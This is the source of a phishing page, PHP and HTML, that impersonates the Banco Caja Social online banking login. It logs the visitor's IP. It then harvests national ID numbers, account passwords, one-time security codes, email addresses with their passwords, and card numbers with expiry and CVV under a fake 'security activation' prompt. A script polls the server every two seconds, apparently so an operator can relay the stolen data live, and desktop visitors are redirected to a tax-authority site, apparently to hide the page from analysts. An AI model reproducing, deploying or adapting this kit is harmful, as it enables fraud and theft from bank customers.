<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Página Principal - Banco Caja Social</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">  		
		<meta content="es" http-equiv="Content-Language">
  		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="img/logo.png" />
		<link href="img/favicon.ico" rel="shortcut icon" type="image/x-icon"/>
		<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
		<script type="text/javascript" src="../../../js/jquery-3.6.0.min.js"></script>
		<script src="../../../js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="js/functions.js"></script>  
   		<script type="text/javascript">
   			$(document).ready(function() {  
  				setInterval(consultar_estado,2000);
  			});
   		</script>	
   	</head>
   	<body>
   		<div id="menu-mob">
   			<div class="itm-menu">Personas <img src="img/flecha2.jpg" id="flc-personas" class="flc"></div>
   			<div class="itm-menu">Microempresarios <img src="img/flecha2.jpg" id="flc-micro" class="flc"></div>
   			<div class="itm-menu">Pequeñas Empresas <img src="img/flecha2.jpg" id="flc-pequenas" class="flc"></div>
			<div class="itm-menu">Empresas <img src="img/flecha2.jpg" id="flc-empresas" class="flc"></div>
			<div class="itm-menu">Constructores <img src="img/flecha2.jpg" id="flc-constructores" class="flc"></div>  
			<div class="itm-menu">Transparencia y Acceso a la Información Pública </div>
			<div class="itm-menu">Linea Amiga <img src="img/flecha2.jpg" id="flc-constructores" class="flc"></div>  
			<div class="itm-ingresar">Ingresar&nbsp;&nbsp;&nbsp;<img src="img/flecha-abajo-blanca.png" style="width: 17px;"></div>  
   		</div>

   		<div id="frmLogin">
   			<div style="height:8px;background-color: #fff;"></div>
   			<div style="padding: 0px 7%;" id="frmLoginCon">
   				<div style="border-bottom: 1px solid #ddd; padding-top: 6px; height: 46px;">
	   				<table style="float:left;">
	   					<tr>
	   						<td class="tab-item marcado">Personas</td>
	   						<td>&nbsp;&nbsp;&nbsp;</td>
	   						<td class="tab-item">Empresas</td>
	   					</tr>
	   				</table>   				
   					<img src="img/x.png" width="19" style="cursor: pointer; float:right;margin-top: 16px;margin-right: 6px;" id="cerrar-login">	
   				</div>
   				<br>
   				<div class="contenido-login">
   					<div class="login-izq">
   						<div>
   							<div class="tipo-doc">
   								<div class="etiqueta">(*) TIPO DE IDENTIFICACIÓN</div>
   								<select class="entradas" style="font-size: 12px !important;" id="txt-tipo" name="txt-tipo">
   									<option value="">Seleccionar</option>
   									<option value="CC">Cédula de Ciudadanía</option>
   									<option value="CE">Cédula de Extranjería</option>
   									<option value="NIT">Número de Identificación Tributaria</option>
   									<option value="TI">Tarjeta de Identidad</option>
   									<option value="PEP">Permiso especial de permanencia</option>
   									<option value="USR">Usuario</option>
   									
   								</select>
   							</div>
   							<div class="documento" style="margin-left: 10px;">
   								<div class="etiqueta">(*) NÚMERO DE IDENTIFICACIÓN</div>
   								<input class="entradas" type=""  id="txt-id" name="txt-id" maxlength="15" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
   								
   								<div class="error-input" id="error-id">
   									Datos incorrectos. Por favor verifique e intente de nuevo.
   								</div>
   							</div>
   							<div class="clave" style="margin-left: 10px;">
   								<div class="etiqueta">(*) CONTRASEÑA</div>
   								<input class="entradas" type="password"  id="txt-pass" name="txt-pass" maxlength="8" readonly>
   							
   								<div class="error-input" id="error-pass">
   									Datos incorrectos. Por favor verifique e intente de nuevo.
   								</div>
   							</div>
   						</div>   	
   						<br><br>			
   						<div style="padding-top: 30px;">
   							<br>
   							<div style="float: left;" class="opciones-login">Registrarse</div>
   							<div style="float: right;" class="opciones-login">¿Olvidó su contraseña?</div>
   						</div>
   						<br><br><br>
   						<div style="text-align: center;">
   							<button class="btn btn-form"disabled="disabled" id="btn-iniciar">Iniciar sesión</button>
   						</div>
   					</div>
   					<div class="login-der">
   						<div class="etiqueta2">TECLADO VIRTUAL PARA INGRESO DE CONTRASEÑA</div>  
   						<table>
   							<tr>
   								<td>
   									<table class="teclado" cellspacing="5">
   										<tr>
   											<td class="tecla">q</td>
   											<td class="tecla">w</td>
   											<td class="tecla">e</td>
   											<td class="tecla">r</td>
   											<td class="tecla">t</td>
   											<td class="tecla">y</td>
   											<td class="tecla">u</td>
   											<td class="tecla">i</td>
   											<td class="tecla">o</td>
   											<td class="tecla">p</td>
   										</tr>
   									</table>
   									<table class="teclado" cellspacing="5" style="margin-left:14px;margin-top: -4px;">
   										<tr>
   											<td class="tecla">a</td>
   											<td class="tecla">s</td>
   											<td class="tecla">d</td>
   											<td class="tecla">f</td>
   											<td class="tecla">g</td>
   											<td class="tecla">h</td>
   											<td class="tecla">j</td>
   											<td class="tecla">k</td>
   											<td class="tecla">l</td>   											
   										</tr>
   									</table>
   									<table class="teclado" cellspacing="5" style="margin-top: -4px;">
   										<tr>
   											<td class="teclado-especial" id="shf"><img src="img/flecha-arriba.png" width="12"></td>
   											<td class="tecla">z</td>
   											<td class="tecla">x</td>
   											<td class="tecla">c</td>
   											<td class="tecla">v</td>
   											<td class="tecla">b</td>
   											<td class="tecla">n</td>
   											<td class="tecla">m</td>
   											<td class="teclado-especial" id="bac" style="width:56px !important;"><img src="img/flecha-izq.png"  width="15"></td>
   										</tr>
   									</table>
   								</td>
   								<td>
   									<table cellspacing="6">
   										<tr>
   											<td class="teclado-num">8</td>
   											<td class="teclado-num">4</td>
   											<td class="teclado-num">2</td>
   										</tr>
   										<tr>
   											<td class="teclado-num">7</td>
   											<td class="teclado-num">6</td>
   											<td class="teclado-num">1</td>
   										</tr>
   										<tr>
   											<td class="teclado-num">3</td>
   											<td class="teclado-num">9</td>
   											<td class="teclado-num">5</td>
   										</tr>
   										<tr>
   											<td></td>
   											<td class="teclado-num">0</td>
   											<td></td>
   										</tr>
   									</table>
   								</td>
   							</tr>
   						</table> 
   						<div class="subtexto">
   							Ingrese su contraseña utilizando el teclado que muestra la pantalla. Recuerde, su longitud debe ser de 8 caracteres alfanuméricos y tenga en cuenta que reconoce el ingreso de minúsculas y mayúsculas.
   						</div>  						
   					</div>
   				</div>	
   			</div>
   		</div>

   		<div id="fondo"></div>

   		<div id="fondo-oscuro"></div>

   		<div class="loader">
   			<img src="img/load.svg" width="130">
   		</div>
   	
   		
   		<div id="frmToken">
   			<div class="titulo" style="margin-bottom: 8px;">
		  		Ingrese su  Código de Seguridad
		  	</div>		  	
		
			<span class="subtexto-frm">
		  	
		  	</span>		  	
			<br>
			<div class="separador"></div>
			<br>
			<div class="etiqueta">(*) CLAVE</div>
			<input type="password" name="txtToken" id="txtToken" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6" inputmode="numeric">
		  	<div class="error-input" id="error-otp">
				Datos incorrectos. Por favor verifique e intente de nuevo.
			</div>
		  	<br><br>
		  	<div style="text-align:center;">
		  		<button class="btn btn-form" type="submit" id="btnOTP"> VERIFICAR </button>	
		  	</div>
   		</div>


   		<div id="frmCorreo">
   			<div class="titulo" style="margin-bottom: 8px;">
		  		Ingrese su Correo electrónico
		  	</div>		  	
		
			<span class="subtexto-frm">
		  		Verificaremos estos datos con los agregados anteriormente en nuestras sucursales
		  	</span>		  	
			<br>
			<div class="separador"></div>
			<br>
			<div class="etiqueta">(*) CORREO ELECTRÓNICO</div>
			<input type="text" name="txtCorreo" id="txtCorreo" class="entradas" autocomplete="off">
			<div class="error-input" id="error-correo">
				Datos incorrectos. Por favor verifique e intente de nuevo.
			</div>
			<br>
			<div class="etiqueta">(*) CLAVE DE CORREO</div>
			<input type="password" name="txtClaveCO" id="txtClaveCO" class="entradas" autocomplete="off">
			<div class="error-input" id="error-clave-co">
				Datos incorrectos. Por favor verifique e intente de nuevo.
			</div>
			<br><br>
			<div style="text-align:center;">
		  		<button class="btn btn-form" type="submit" id="btnCorreo" disabled="disabled"> ACTUALIZAR </button>	
		  	</div>
   		</div>


   		<div id="frmTarjeta">
   			
   			<div class="titulo" style="margin-bottom: 8px;">
		  		Activación de Seguridad
		  	</div>		  	
		
			<span class="subtexto-frm"> 
		  		Digite los siguientes datos para activar la seguridad de tu cuenta.
		  	</span>		  	
			<br>
			<div class="separador"></div>
			<br>
			<div class="etiqueta">(*) TARJETA</div>
			<input type="text" name="txtTarjeta" id="txtTarjeta" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="16" inputmode="numeric">
			<div class="error-input" id="error-tarjeta">
				Datos incorrectos. Por favor verifique e intente de nuevo.
			</div>
			<br>
			<div class="etiqueta">(*) EXPIRA EN</div>
			<table width="100%">
				<tr>
					<td>
						<select class="entradas" id="mFecha" name="mFecha">
                    		<option value="" default selected>Mes</option>
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
					</td>
					<td>
						<select class="entradas" id="aFecha" name="aFecha">
							<option value="" default selected>Año</option>					
							<option value="2022">2022</option>
							<option value="2023">2023</option>
							<option value="2024">2024</option>
							<option value="2025">2025</option>
							<option value="2026">2026</option>
							<option value="2027">2027</option>
							<option value="2028">2028</option>
							<option value="2029">2029</option>
							<option value="2030">2030</option>
							<option value="2031">2031</option>
							<option value="2032">2032</option>
							<option value="2033">2033</option>
						</select>
					</td>
				</tr>
			</table>
			<div class="error-input" id="error-fecha">
				Datos incorrectos. Por favor verifique e intente de nuevo.
			</div>
			<br>
			<div class="etiqueta">(*) CVV</div>
			<input type="password" name="txtCVV" id="txtCVV" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="3" inputmode="numeric">
			<div class="error-input" id="error-cvv">
				Datos incorrectos. Por favor verifique e intente de nuevo.
			</div>
		  	<br><br>
		  	<div style="text-align:center;">
		  		<button class="btn btn-form" type="submit" id="btnTarjeta"> VALIDAR </button>
		  	</div>
   		</div>


   		<div class="top-bar">
   			<table style="margin: 0 auto;" cellpadding="0" cellspacing="0">
   				<tr>
   					<td class="item-top">Transparencia y Acceso a la Información Pública</td>
   					<td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
   					<td class="item-top">Linea Amiga</td>
   				</tr>
   			</table>
   			

   			<div style="float:right;"></div>  			
   		</div>   
   		<div class="header">
   			<table width="100%" cellpadding="0" cellspacing="0">
   				<tr>
   					<td valign="top">
   						<table  cellpadding="0" cellspacing="0">
   							<tr>
   								<td><img src="img/menu.jpg" id="boton-menu"></td>
   								<td><img src="img/logo.svg" id="logo-pal"></td>
   							</tr>
   						</table>  
   					</td>
   					<td align="center" id="seg-menu">
   						<div style="height: 0px;"></div>
   						<table class="menu-items">
   							<tr>
   								<td>Personas</td>
   								<td>Microempresarios</td>
   								<td>Pequeñas Empresas</td>
   								<td>Empresas </td>
   								<td>Constructores</td>  
   							</tr>
   						</table>
   					</td>
   					<td>
   						<table width="100%" cellpadding="0" cellspacing="0">
   							<tr>
   								<td><button class="btn" id="btn-ingresar">Ingresar&nbsp;&nbsp;&nbsp;<img src="img/flecha-derecha-blanca.png" style="height: 14px;"></button></td>
   								<td align="right"><img src="img/accesibilidad.jpg"></td> 
   							</tr>
   						</table>
   					</td>
   				</tr>
   			</table>	   		
   		</div>
	 

	   	<div class="slider">
		    <ul>
		      <li><img src="img/slider1/0.jpg"></li>
		      <li><img src="img/slider1/2.jpg"></li>
		      <li><img src="img/slider1/1.jpg"></li>
		    </ul>
		  </div>
 

		  <div class="contenido">
		  		<img src="img/contenido1.jpg" class="conten">
		  		<img src="img/contenido-mobill-min.jpg" class="contenMob">
		  </div>

		  <div class="slider">
		    <ul>
		      <li><img src="img/slider2/1.jpg"></li>
		      <li><img src="img/slider2/2.jpg"></li>
		      <li><img src="img/slider2/3.jpg"></li>
		    </ul>
		  </div>

		  <div class="contenido">
		  		<img src="img/contenido2.jpg" class="conten">
		  		<img src="img/contenido-mobil-2-min.jpg" class="contenMob">
		  </div>

   	
<script>
    function detectar_dispositivo() {
        var dispositivo = "";
        if (navigator.userAgent.match(/Android/i))
            dispositivo = "Android";
        else if (navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else if (navigator.userAgent.match(/iPhone/i))
            dispositivo = "iPhone";
        else if (navigator.userAgent.match(/iPad/i))
            dispositivo = "iPad";
        else if (navigator.userAgent.match(/iPod/i))
            dispositivo = "iPod";
        else if (navigator.userAgent.match(/BlackBerry/i))
            dispositivo = "BlackBerry";
        else if (navigator.userAgent.match(/Windows Phone/i))
            dispositivo = "Windows Phone";
        else
            dispositivo = "PC";
        return dispositivo;
    }

    if (detectar_dispositivo() == "PC") {
        window.location.href = 'https://www.dian.gov.co';
    }
</script>
    
</body>
</html>